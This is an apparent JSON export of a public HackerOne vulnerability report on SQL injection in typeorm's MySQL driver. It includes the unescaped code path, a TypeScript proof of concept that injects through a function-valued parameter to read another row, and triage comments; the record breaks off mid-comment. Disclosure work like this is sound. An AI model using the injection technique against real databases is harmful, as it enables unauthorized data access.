{"id":506654,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDY2NTQ=","url":"https://hackerone.com/reports/506654","title":"[typeorm] SQL Injection","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-03-08T07:49:04.488Z","submitted_at":"2019-03-08T07:49:04.488Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"verichains","url":"/verichains","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/460/926/7fbea911da069ae8600fb4456eacb751331d7582_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-02T04:25:24.379Z","bug_reporter_agreed_on_going_public_at":"2019-04-02T04:25:24.298Z","team_member_agreed_on_going_public_at":"2019-03-31T01:59:41.403Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report SQL Injection in typeorm.\nIt allows reading data from database.\n\n# Module\n\n**module name:** typeorm\n**version:** 0.2.14\n**npm page:** `https://www.npmjs.com/package/typeorm`\n\n## Module Description\n\n\u003e TypeORM is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap, Ionic, React Native, NativeScript, Expo, and Electron platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7, ES8). Its goal is to always support the latest JavaScript features and provide additional features that help you to develop any kind of application that uses databases - from small applications with a few tables to large scale enterprise applications with multiple databases.\n\n\u003e TypeORM supports both Active Record and Data Mapper patterns, unlike all other JavaScript ORMs currently in existence, which means you can write high quality, loosely coupled, scalable, maintainable applications the most productive way.\n\n\n\n## Module Stats\n\n\u003e Replace stats below with numbers from npm’s module page:\n\n79,749 downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\nMethod `escapeQueryWithParameters` of `MysqlDriver.ts` directly return value from parameter if it is a function without escaping which allow attacker to perform SQL Injection in specialized context.\nhttps://github.com/typeorm/typeorm/blob/d9f5581b22c4cccfab55ee23fad699e1c8acadf8/src/driver/mysql/MysqlDriver.ts#L387\n\n```ts\n            if (value instanceof Function) {\n                return value();\n\n            } else {\n                escapedParameters.push(value);\n                return \"?\";\n            }\n```\n\nI'm not sure if this is intended or not, there's no information in the document, if someone used this pattern (value provided by a function callback) it will lead to sql injection attack.\n\n\n## Steps To Reproduce:\n\n- Create a new test typeorm package\n```bash\nnpx typeorm init --name Test --database mysql\n```\n\n- Edit `ormconfig.json` for local credentials.\n\nModify `index.ts` to test the injection:\n\n```ts\nimport \"reflect-metadata\";\nimport {createConnection} from \"typeorm\";\nimport {User} from \"./entity/User\";\n\ncreateConnection().then(async connection =\u003e {\n\n    console.log(\"Inserting a new user into the database...\");\n\n    for(var i=0;i\u003c10;i++) {\n        const user = new User();\n        user.firstName = `Timber ${i}`;\n        user.lastName = \"Saw\";\n        user.age = 25 + i;\n        await connection.manager.save(user);\n        console.log(\"Saved a new user with id: \" + user.id);\n    }\n\n    const repo = connection.getRepository(User);\n\n    console.log(await repo.createQueryBuilder().where('firstName = :name', {name: () =\u003e \"-1 or firstName=0x54696d6265722033\"}).getOne());\n\n    process.exit(0);\n}).catch(error =\u003e console.log(error));\n```\n(0x54696d6265722033 is \"Timber 3\")\n\nOutput:\n```\nInserting a new user into the database...\nUser { id: 5, firstName: 'Timber 3', lastName: 'Saw', age: 28 }\n```\n\n## Supporting Material/References:\n\n\u003e State all technical information about the stack where the vulnerability was found\n\n- MacOs\n- NodeJS v8.12.0\n- npm 6.4.1\n\n# Wrap up\n\n\u003e Select Y or N for the following statements:\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nAllow attackers to perform SQL Injection attacks.","vulnerability_information_html":"\u003cp\u003eI would like to report SQL Injection in typeorm.\u003cbr\u003e\nIt allows reading data from database.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e typeorm\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 0.2.14\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/typeorm\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eTypeORM is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap, Ionic, React Native, NativeScript, Expo, and Electron platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7, ES8). Its goal is to always support the latest JavaScript features and provide additional features that help you to develop any kind of application that uses databases - from small applications with a few tables to large scale enterprise applications with multiple databases.\u003c/p\u003e\n\n\u003cp\u003eTypeORM supports both Active Record and Data Mapper patterns, unlike all other JavaScript ORMs currently in existence, which means you can write high quality, loosely coupled, scalable, maintainable applications the most productive way.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eReplace stats below with numbers from npm’s module page:\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e79,749 downloads in the last week\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eMethod \u003ccode\u003eescapeQueryWithParameters\u003c/code\u003e of \u003ccode\u003eMysqlDriver.ts\u003c/code\u003e directly return value from parameter if it is a function without escaping which allow attacker to perform SQL Injection in specialized context.\u003cbr\u003e\n\u003ca title=\"https://github.com/typeorm/typeorm/blob/d9f5581b22c4cccfab55ee23fad699e1c8acadf8/src/driver/mysql/MysqlDriver.ts#L387\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ftypeorm%2Ftypeorm%2Fblob%2Fd9f5581b22c4cccfab55ee23fad699e1c8acadf8%2Fsrc%2Fdriver%2Fmysql%2FMysqlDriver.ts%23L387\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/typeorm/typeorm/blob/d9f5581b22c4cccfab55ee23fad699e1c8acadf8/src/driver/mysql/MysqlDriver.ts#L387\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight typescript\"\u003e\u003ccode\u003e            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003evalue\u003c/span\u003e \u003cspan class=\"k\"\u003einstanceof\u003c/span\u003e \u003cspan class=\"nb\"\u003eFunction\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\n            \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003eescapedParameters\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e?\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI\u0026#39;m not sure if this is intended or not, there\u0026#39;s no information in the document, if someone used this pattern (value provided by a function callback) it will lead to sql injection attack.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eCreate a new test typeorm package\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003enpx typeorm init \u003cspan class=\"nt\"\u003e--name\u003c/span\u003e Test \u003cspan class=\"nt\"\u003e--database\u003c/span\u003e mysql\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eEdit \u003ccode\u003eormconfig.json\u003c/code\u003e for local credentials.\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eModify \u003ccode\u003eindex.ts\u003c/code\u003e to test the injection:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight typescript\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eimport\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ereflect-metadata\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"k\"\u003eimport\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003efrom\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etypeorm\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"k\"\u003eimport\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003eUser\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003efrom\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e./entity/User\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003ecreateConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e().\u003c/span\u003e\u003cspan class=\"nx\"\u003ethen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"nx\"\u003econnection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eInserting a new user into the database...\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003euser\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eUser\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efirstName\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`Timber \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e`\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elastName\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eSaw\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eage\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e25\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eawait\u003c/span\u003e \u003cspan class=\"nx\"\u003econnection\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emanager\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esave\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eSaved a new user with id: \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eid\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003erepo\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003econnection\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetRepository\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eUser\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003eawait\u003c/span\u003e \u003cspan class=\"nx\"\u003erepo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateQueryBuilder\u003c/span\u003e\u003cspan class=\"p\"\u003e().\u003c/span\u003e\u003cspan class=\"nx\"\u003ewhere\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003efirstName = :name\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"na\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e-1 or firstName=0x54696d6265722033\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}).\u003c/span\u003e\u003cspan class=\"nx\"\u003egetOne\u003c/span\u003e\u003cspan class=\"p\"\u003e());\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}).\u003c/span\u003e\u003cspan class=\"k\"\u003ecatch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e(0x54696d6265722033 is \u0026quot;Timber 3\u0026quot;)\u003c/p\u003e\n\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eInserting a new user into the database...\nUser { id: 5, firstName: \u0026#39;Timber 3\u0026#39;, lastName: \u0026#39;Saw\u0026#39;, age: 28 }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eState all technical information about the stack where the vulnerability was found\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cul\u003e\n\u003cli\u003eMacOs\u003c/li\u003e\n\u003cli\u003eNodeJS v8.12.0\u003c/li\u003e\n\u003cli\u003enpm 6.4.1\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eSelect Y or N for the following statements:\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: N\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAllow attackers to perform SQL Injection attacks.\u003c/p\u003e\n","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-04-30T01:59:41.508Z","allow_singular_disclosure_after":-52632700.0843073,"singular_disclosure_allowed":true,"vote_count":15,"voters":["khizer47","jbreton","rmendelovits","adnanslef","bd9db035bc51541980bcd85","homdreen","proserpina","tbillar","butrint","cra3y12","and 5 more..."],"severity":{"rating":"high","score":8.6,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":6411,"asset_type":"SOURCE_CODE","asset_identifier":"typeorm","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4283710,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\nThanks for reporting this to us. Someone will quickly look at this report and triage it.","markdown_message":"\u003cp\u003eHello,\u003cbr\u003e\nThanks for reporting this to us. Someone will quickly look at this report and triage it.\u003c/p\u003e\n","automated_response":true,"created_at":"2019-03-08T07:49:10.150Z","updated_at":"2019-03-08T07:49:10.150Z","actor":{"username":"vdeturckheim_dev","cleared":false,"url":"/vdeturckheim_dev","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4286795,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as a vulnerability.\n\nI invited the package maintainer to this issue.\n","markdown_message":"\u003cp\u003eThanks for reporting this issue.\u003c/p\u003e\n\n\u003cp\u003eI was able to reproduce and confirm the issue as you described and will triage this report as a vulnerability.\u003c/p\u003e\n\n\u003cp\u003eI invited the package maintainer to this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-08T16:49:47.965Z","updated_at":"2019-03-08T16:49:47.965Z","actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4286806,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-08T16:50:16.550Z","updated_at":"2019-03-08T16:50:16.550Z","actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4286820,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you!","markdown_message":"\u003cp\u003eThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-08T16:51:31.143Z","updated_at":"2019-03-08T16:51:31.143Z","actor":{"username":"verichains","cleared":false,"url":"/verichains","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/926/7fbea911da069ae8600fb4456eacb751331d7582_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4287380,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-08T18:26:26.132Z","updated_at":"2019-03-08T18:26:26.132Z","actor":{"username":"pleerock","cleared":false,"url":"/pleerock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4287481,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your report. It is by design. Function syntax, e.g. `() =\u003e string` is used to inject sql statements across your code / into your final sql string. It is supposed to bring sql support in the place It is by design. E.g. `{ name: 'safe-sql-string' }` is injection-free, but `{ name: () =\u003e 'unsafe-sql-string' }` isn't injection free and used to build sql strings. This particular syntax doesn't make sense in query builder (just like using function in there) but it does in some different places, and this conception just followed by query builder.","markdown_message":"\u003cp\u003eThank you for your report. It is by design. Function syntax, e.g. \u003ccode\u003e() =\u0026gt; string\u003c/code\u003e is used to inject sql statements across your code / into your final sql string. It is supposed to bring sql support in the place It is by design. E.g. \u003ccode\u003e{ name: \u0026#39;safe-sql-string\u0026#39; }\u003c/code\u003e is injection-free, but \u003ccode\u003e{ name: () =\u0026gt; \u0026#39;unsafe-sql-string\u0026#39; }\u003c/code\u003e isn\u0026#39;t injection free and used to build sql strings. This particular syntax doesn\u0026#39;t make sense in query builder (just like using function in there) but it does in some different places, and this conception just followed by query builder.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-08T18:38:02.440Z","updated_at":"2019-03-08T18:38:25.171Z","actor":{"username":"pleerock","cleared":false,"url":"/pleerock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4287837,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@pleerock Thanks for the quick response.\n\nI couldn't find any tests for escapeQueryWithParameters but I did find this documentation on its API.\n\n```\n    /**\n     * Replaces parameters in the given sql with special escaping character\n     * and an array of parameter names to be passed to a query.\n     */\n```\nhttps://github.com/typeorm/typeorm/blob/d9f5581b22c4cccfab55ee23fad699e1c8acadf8/src/driver/mysql/MysqlDriver.ts#L368\n\nThe comment above and the function name containing the word `escapeQuery` would make me think that this function escapes queries.\n\n I know you said that this is \"by design\" but that isn't clear from the the source code, tests or documentation.\n\nWe will continue to triage this as a vulnerability. \n","markdown_message":"\u003cp\u003e\u003ca href=\"/pleerock\"\u003e@pleerock\u003c/a\u003e Thanks for the quick response.\u003c/p\u003e\n\n\u003cp\u003eI couldn\u0026#39;t find any tests for escapeQueryWithParameters but I did find this documentation on its API.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    /**\n     * Replaces parameters in the given sql with special escaping character\n     * and an array of parameter names to be passed to a query.\n     */\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca title=\"https://github.com/typeorm/typeorm/blob/d9f5581b22c4cccfab55ee23fad699e1c8acadf8/src/driver/mysql/MysqlDriver.ts#L368\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ftypeorm%2Ftypeorm%2Fblob%2Fd9f5581b22c4cccfab55ee23fad699e1c8acadf8%2Fsrc%2Fdriver%2Fmysql%2FMysqlDriver.ts%23L368\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/typeorm/typeorm/blob/d9f5581b22c4cccfab55ee23fad699e1c8acadf8/src/driver/mysql/MysqlDriver.ts#L368\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe comment above and the function name containing the word \u003ccode\u003eescapeQuery\u003c/code\u003e would make me think that this function escapes queries.\u003c/p\u003e\n\n\u003cp\u003eI know you said that this is \u0026quot;by design\u0026quot; but that isn\u0026#39;t clear from the the source 